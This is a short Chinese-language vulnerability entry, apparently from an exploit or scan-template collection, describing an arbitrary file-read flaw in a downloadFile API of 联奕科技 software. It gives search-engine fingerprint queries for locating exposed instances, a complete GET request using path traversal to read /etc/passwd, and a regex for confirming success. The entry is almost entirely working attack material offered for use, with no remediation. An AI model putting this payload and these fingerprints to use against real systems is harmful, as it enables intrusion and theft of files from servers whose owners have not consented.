# 联奕科技-downloadFile-文件读取漏洞

联奕科技-downloadFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`fofa:body=" window.mobileSafePassWord" ｜ body="解决 IE8、IE9 不支持 console 问题" hunter:web.body="window.mobileSafePassWord"`
- **请求**：`GET /api/bd-api/apiSearch/downloadFile?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$